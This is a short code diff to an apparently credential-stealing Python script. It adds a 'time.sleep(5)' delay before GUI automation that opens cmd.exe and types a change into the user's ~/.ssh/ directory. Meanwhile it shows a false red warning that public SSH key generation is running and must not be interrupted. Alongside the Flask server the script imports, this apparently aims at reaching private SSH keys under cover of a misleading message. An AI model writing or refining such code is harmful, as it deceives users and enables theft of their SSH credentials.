@@ -7,6 +7,7 @@ import webbrowser
 import platform
 from flask import Flask, make_response
 import sys
+import time
 
 app = Flask(__name__)
 
@@ -39,6 +40,7 @@ def main():
         if platform.system() == "Windows":
             print(Fore.RED + "[!] STARTING PUBLIC SSH KEY GENERATION, DO NOT INTERFERE WITH THE PROCEDURE TO AVOID MALFUNCTIONS!")
             subprocess.Popen('cmd.exe')
+            time.sleep(5)
             realbro = os.path.expanduser(r"~/.ssh/")
             pyautogui.typewrite(f"cd {realbro}")
             pyautogui.press("enter")
